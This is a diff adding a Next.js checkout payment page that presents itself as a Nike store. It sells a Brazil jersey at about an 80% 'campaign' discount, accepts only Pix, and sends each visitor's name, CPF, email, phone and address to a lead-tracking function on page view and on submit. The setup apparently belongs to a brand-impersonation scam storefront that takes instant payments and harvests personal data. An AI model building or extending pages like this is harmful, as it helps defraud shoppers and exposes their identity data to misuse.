@@ -1,0 +1,436 @@
+"use client";
+
+import Image from "next/image";
+import Link from "next/link";
+import { useEffect, useMemo, useState } from "react";
+import { useRouter } from "next/navigation";
+import NikeCheckoutHeader from "../../components/NikeCheckoutHeader";
+import { readLeadDraft, trackLeadEvent } from "@/lib/site-tracking";
+
+type LeadDraft = {
+  name?: string;
+  cpf?: string;
+  email?: string;
+  phone?: string;
+};
+
+type CheckoutShipping = {
+  id?: string;
+  cep?: string;
+  address?: string;
+  street?: string;
+  neighborhood?: string;
+  city?: string;
+  state?: string;
+  number?: string;
+  complement?: string;
+  eta?: string;
+  name?: string;
+  price?: number;
+  couponApplied?: boolean;
+};
+
+type CartState = {
+  title?: string;
+  color?: string;
+  size?: string;
+  sku?: string;
+  quantity?: number;
+  image?: string;
+  priceValue?: number;
+  shipping?: CheckoutShipping;
+};
+
+const CART_STORAGE_KEY = "nikepromo.cartState";
+const ORIGINAL_PRICE_VALUE = 749.99;
+const DEFAULT_PRICE_VALUE = 139.19;
+const DEFAULT_CART: CartState = {
+  title: "Camisa Brasil Jordan II 2026/27 Jogador Masculina",
+  color: "Azul",
+  size: "M",
+  sku: "IU1074-417",
+  quantity: 1,
+  image: "/assets/nike-brazil-jordan-ii-a3.jpg",
+  priceValue: DEFAULT_PRICE_VALUE,
+  shipping: {
+    id: "normal",
+    name: "Normal",
+    eta: "5 dias uteis",
+    price: 0,
+    couponApplied: true,
+  },
+};
+
+function formatCurrency(value: number) {
+  return new Intl.NumberFormat("pt-BR", {
+    style: "currency",
+    currency: "BRL",
+  }).format(value);
+}
+
+function readStoredCartState(): CartState {
+  if (typeof window === "undefined") {
+    return DEFAULT_CART;
+  }
+
+  try {
+    const raw = window.localStorage.getItem(CART_STORAGE_KEY);
+    if (!raw) {
+      return DEFAULT_CART;
+    }
+
+    const parsed = JSON.parse(raw) as CartState;
+    return {
+      ...DEFAULT_CART,
+      ...parsed,
+      shipping: {
+        ...DEFAULT_CART.shipping,
+        ...(parsed.shipping || {}),
+      },
+    };
+  } catch {
+    return DEFAULT_CART;
+  }
+}
+
+function parseAddressLine(address: string) {
+  const parts = String(address || "")
+    .split("â€¢")
+    .map((part) => part.trim())
+    .filter(Boolean);
+
+  const location = parts[parts.length - 1] || "";
+  const [city = "", state = ""] = location.split("/").map((part) => part.trim());
+
+  return {
+    street: parts[0] || "",
+    neighborhood: parts.length > 2 ? parts[1] : "",
+    city,
+    state,
+  };
+}
+
+function buildShippingFromCart(input?: CheckoutShipping): CheckoutShipping {
+  const base = input || {};
+  const parsed = parseAddressLine(base.address || "");
+
+  return {
+    ...base,
+    ...parsed,
+  };
+}
+
+function CheckoutSteps() {
+  const steps = [
+    { number: 1, label: "Carrinho", active: false },
+    { number: 2, label: "Identificacao", active: false },
+    { number: 3, label: "Pagamento", active: true },
+  ];
+
+  return (
+    <div className="overflow-hidden rounded-2xl border border-black/10 bg-[#ececec]">
+      <div className="flex">
+        {steps.map((step, index) => (
+          <div
+            key={step.label}
+            className={`relative flex min-h-12 flex-1 items-center justify-center gap-2 px-3 text-[0.84rem] font-semibold ${
+              step.active ? "bg-white text-black" : "bg-[#e7e7e7] text-[#757575]"
+            }`}
+          >
+            {index > 0 && (
+              <span
+                aria-hidden="true"
+                className="absolute left-0 top-0 h-full w-5 bg-white"
+                style={{ clipPath: "polygon(0 0, 100% 50%, 0 100%)" }}
+              />
+            )}
+            {index < steps.length - 1 && (
+              <span
+                aria-hidden="true"
+                className={`absolute -right-5 top-0 h-full w-5 ${
+                  step.active ? "bg-white" : "bg-[#e7e7e7]"
+                }`}
+                style={{ clipPath: "polygon(0 0, 100% 50%, 0 100%)" }}
+              />
+            )}
+            <span
+              className={`relative z-10 inline-flex h-5 w-5 items-center justify-center rounded-full text-[0.68rem] ${
+                step.active ? "bg-black text-white" : "bg-[#8d8d8d] text-white"
+              }`}
+            >
+              {step.number}
+            </span>
+            <span className="relative z-10 whitespace-nowrap">{step.label}</span>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+export default function CheckoutPagamentoPage() {
+  const router = useRouter();
+  const [lead, setLead] = useState<LeadDraft>({});
+  const [cart, setCart] = useState<CartState>(DEFAULT_CART);
+  const [shipping, setShipping] = useState<CheckoutShipping>(
+    DEFAULT_CART.shipping || {},
+  );
+
+  useEffect(() => {
+    const storedLead = readLeadDraft() as LeadDraft;
+    const storedCart = readStoredCartState();
+    const normalizedShipping = buildShippingFromCart(storedCart.shipping);
+
+    setLead(storedLead);
+    setCart(storedCart);
+    setShipping(normalizedShipping);
+
+    void trackLeadEvent({
+      event: "payment_view",
+      stage: "pagamento",
+      page: "pagamento",
+      amount:
+        Number(storedCart.priceValue || DEFAULT_PRICE_VALUE) *
+          Number(storedCart.quantity || 1) +
+        Number(normalizedShipping.price || 0),
+      personal: {
+        name: storedLead.name || "",
+        cpf: storedLead.cpf || "",
+        email: storedLead.email || "",
+        phone: storedLead.phone || "",
+      },
+      address: {
+        cep: normalizedShipping.cep || "",
+        street: normalizedShipping.street || "",
+        neighborhood: normalizedShipping.neighborhood || "",
+        city: normalizedShipping.city || "",
+        state: normalizedShipping.state || "",
+      },
+      shipping: {
+        id: normalizedShipping.id || "",
+        name: normalizedShipping.name || "",
+        price: normalizedShipping.price || 0,
+      },
+    });
+  }, []);
+
+  const productPriceValue = useMemo(
+    () => Number(cart.priceValue || DEFAULT_PRICE_VALUE),
+    [cart.priceValue],
+  );
+  const quantity = useMemo(() => Number(cart.quantity || 1), [cart.quantity]);
+  const productSubtotalValue = useMemo(
+    () => Number((productPriceValue * quantity).toFixed(2)),
+    [productPriceValue, quantity],
+  );
+  const shippingPriceValue = useMemo(
+    () => Number(shipping.price || 0),
+    [shipping.price],
+  );
+  const totalPriceValue = useMemo(
+    () => Number((productSubtotalValue + shippingPriceValue).toFixed(2)),
+    [productSubtotalValue, shippingPriceValue],
+  );
+  const campaignSavingsValue = useMemo(
+    () =>
+      Number(
+        Math.max(ORIGINAL_PRICE_VALUE * quantity - productSubtotalValue, 0).toFixed(2),
+      ),
+    [productSubtotalValue, quantity],
+  );
+
+  const addressLine = [shipping.street, shipping.number]
+    .filter(Boolean)
+    .join(", ");
+  const complementLine = shipping.complement || "";
+  const locationLine = [shipping.neighborhood, shipping.city, shipping.state]
+    .filter(Boolean)
+    .join(", ");
+  const deliveryLabel =
+    shipping.id === "nike-expresso"
+      ? "Entrega Nike Expresso em ate 2 dias uteis"
+      : "Entrega em ate 5 dias uteis";
+
+  const handleFinalize = async () => {
+    await trackLeadEvent({
+      event: "payment_submit",
+      stage: "pagamento",
+      page: "pagamento",
+      amount: totalPriceValue,
+      personal: {
+        name: lead.name || "",
+        cpf: lead.cpf || "",
+        email: lead.email || "",
+        phone: lead.phone || "",
+      },
+      address: {
+        cep: shipping.cep || "",
+        street: shipping.street || "",
+        neighborhood: shipping.neighborhood || "",
+        city: shipping.city || "",
+        state: shipping.state || "",
+      },
+      extra: {
+        number: shipping.number || "",
+        complement: shipping.complement || "",
+      },
+      shipping: {
+        id: shipping.id || "",
+        name: shipping.name || "",
+        price: shipping.price || 0,
+      },
+    });
+
+    router.push("/pix");
+  };
+
+  return (
+    <main className="min-h-screen bg-white text-black">
+      <NikeCheckoutHeader backHref="/checkout" />
+
+      <div className="mx-auto w-full max-w-[38rem] px-4 pb-10 pt-20">
+        <CheckoutSteps />
+
+        <section className="border-b border-black/10 py-8">
+          <h1 className="text-[2.35rem] font-semibold leading-none">
+            Pagamento
+          </h1>
+
+          <div className="mt-7 rounded-[1.8rem] border border-black/10 p-5">
+            <h2 className="text-[1.2rem] font-semibold">
+              Selecione um meio de pagamento
+            </h2>
+
+            <button
+              type="button"
+              className="mt-5 flex w-full items-start gap-4 rounded-[1.4rem] border border-black bg-[#f7f7f7] px-4 py-4 text-left"
+            >
+              <span className="mt-1 inline-flex h-6 w-6 flex-none items-center justify-center rounded-full border border-black">
+                <span className="h-3 w-3 rounded-full bg-black" />
+              </span>
+              <div className="min-w-0 flex-1">
+                <p className="text-[1.08rem] font-semibold">Pix</p>
+                <p className="mt-1 text-[0.98rem] text-black/64">
+                  Pagamento instantaneo para liberar sua oferta na hora
+                </p>
+              </div>
+            </button>
+          </div>
+        </section>
+
+        <section className="py-8">
+          <div className="flex items-center justify-between gap-4">
+            <h2 className="text-[2.2rem] font-semibold leading-none">
+              Revise o pedido
+            </h2>
+          </div>
+
+          <div className="mt-8 border-b border-black/10 pb-8">
+            <div className="flex items-center justify-between gap-4">
+              <h3 className="text-[1.15rem] font-semibold">Produtos</h3>
+              <Link
+                href="/carrinho"
+                className="text-[1rem] font-medium underline underline-offset-4"
+              >
+                Editar
+              </Link>
+            </div>
+
+            <div className="mt-5 flex items-start gap-4">
+              <div className="overflow-hidden rounded-[1.1rem] bg-[#f3f3f3]">
+                <Image
+                  src={cart.image || DEFAULT_CART.image || ""}
+                  alt={cart.title || DEFAULT_CART.title || "Camisa Nike"}
+                  width={92}
+                  height={92}
+                  className="h-[92px] w-[92px] object-cover"
+                />
+              </div>
+
+              <div className="min-w-0 flex-1">
+                <p className="text-[1.1rem] font-semibold leading-6">
+                  {cart.title || DEFAULT_CART.title}
+                </p>
+                <div className="mt-3 space-y-1 text-[1rem] leading-6 text-black/68">
+                  <p>Quantidade: {quantity}</p>
+                  <p>Tamanho: {cart.size || DEFAULT_CART.size}</p>
+                  <p>Cor: {cart.color || DEFAULT_CART.color}</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div className="border-b border-black/10 py-8">
+            <div className="flex items-center justify-between gap-4">
+              <h3 className="text-[1.15rem] font-semibold">Endereco</h3>
+              <Link
+                href="/checkout"
+                className="text-[1rem] font-medium underline underline-offset-4"
+              >
+                Editar
+              </Link>
+            </div>
+
+            <div className="mt-5 text-right text-[1rem] leading-7">
+              <p className="font-medium">{lead.name || "-"}</p>
+              <p>{addressLine || "-"}</p>
+              {complementLine && <p>{complementLine}</p>}
+              {locationLine && <p>{locationLine}</p>}
+              {shipping.cep && <p>CEP {shipping.cep}</p>}
+              <p className="mt-3 font-medium text-[#0f6a3f]">{deliveryLabel}</p>
+            </div>
+          </div>
+
+          <div className="border-b border-black/10 py-8">
+            <div className="space-y-3 text-[1.05rem]">
+              <div className="flex items-center justify-between gap-4">
+                <span className="text-black/74">Valor dos produtos</span>
+                <span>{formatCurrency(productSubtotalValue)}</span>
+              </div>
+              <div className="flex items-center justify-between gap-4">
+                <span className="text-black/74">Frete</span>
+                <span
+                  className={
+                    shippingPriceValue === 0 ? "font-medium text-[#0f6a3f]" : ""
+                  }
+                >
+                  {shippingPriceValue === 0
+                    ? "Gratis"
+                    : formatCurrency(shippingPriceValue)}
+                </span>
+              </div>
+            </div>
+
+            <div className="mt-6 flex items-start justify-between gap-4">
+              <span className="text-[1.7rem] font-semibold leading-none">
+                Total da compra
+              </span>
+              <div className="text-right">
+                <p className="text-[1.95rem] font-semibold leading-none">
+                  {formatCurrency(totalPriceValue)} no Pix
+                </p>
+              </div>
+            </div>
+
+            <div className="mt-6 rounded-[1.6rem] border border-[#cde8d7] bg-[#f2fbf5] px-4 py-4 text-[#185233]">
+              <p className="text-[0.84rem] font-semibold uppercase tracking-[0.18em] text-[#0f6a3f]">
+                Cupom aplicado
+              </p>
+              <p className="mt-2 text-[1rem] leading-6">
+                Voce esta economizando {formatCurrency(campaignSavingsValue)} com o desconto da campanha.
+              </p>
+            </div>
+          </div>
+
+          <button
+            type="button"
+            onClick={() => void handleFinalize()}
+            className="mt-8 inline-flex min-h-14 w-full items-center justify-center rounded-full bg-black px-6 text-[1rem] font-medium text-white transition-transform duration-300 hover:scale-[1.01]"
+          >
+            Finalizar compra
+          </button>
+        </section>
+      </div>
+    </main>
+  );
+}
